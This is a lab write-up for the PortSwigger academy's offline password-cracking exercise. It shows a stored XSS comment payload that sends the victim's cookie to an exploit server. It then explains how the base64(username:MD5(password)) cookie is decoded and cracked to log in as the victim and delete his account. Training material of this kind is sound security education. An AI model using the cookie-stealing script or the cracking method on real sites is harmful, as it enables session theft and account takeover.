# Offline Password Cracking

This lab stores a user's password hash inside a cookie, and separately has an XSS flaw in its comment feature.

**Goal:** Capture Carlos's stay-logged-in cookie, crack his password offline using it, log in as him, and delete his account from the "My account" page.

- Your credentials: wiener:peter
- Victim's username: carlos

Learning path note: this lab assumes some background not yet covered elsewhere in the learning path — if you get stuck, it may be worth revisiting later.

---

**Reference:**
- https://portswigger.net/web-security/authentication/other-mechanisms

<img width="765" height="285" alt="1" src="https://github.com/user-attachments/assets/12e006cc-9f3a-4514-8396-fa8e6401f4b0" />


---

A comment was posted containing this payload, designed to forward the victim's cookie to the exploit server:

```
<script>var i=new Image;i.src="https://exploit-0a500006035b831a8133a1940130000d.exploit-server.net/log?cookie="+document.cookie;</script>
```

<img width="690" height="608" alt="2" src="https://github.com/user-attachments/assets/7db62a6b-7876-48c0-a1bb-0d915e68600a" />


Carlos's cookie value is captured:

<img width="1063" height="72" alt="3" src="https://github.com/user-attachments/assets/88d25592-633f-4030-9b67-0f4391e57270" />


Logging in as wiener and inspecting the `stay-logged-in` cookie gives: `d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw`:

<img width="810" height="166" alt="4" src="https://github.com/user-attachments/assets/8d9704c0-45db-426c-bb26-735823602a06" />


This uses the same scheme as the earlier lab, `BASE64(username:MD5(password))`:

<img width="880" height="310" alt="5" src="https://github.com/user-attachments/assets/acfdd55b-f140-4260-ac44-88bb7ef962ed" />


Running the hash through a cracker reveals it corresponds to the password "onceuponatime":

<img width="738" height="299" alt="6" src="https://github.com/user-attachments/assets/8762a5c9-d259-43bb-953e-2de9fb18e407" />


With that, it's possible to log into carlos's account and delete it:

<img width="734" height="361" alt="7" src="https://github.com/user-attachments/assets/e2b10ed3-87ad-4340-b00d-ee457fce2589" />

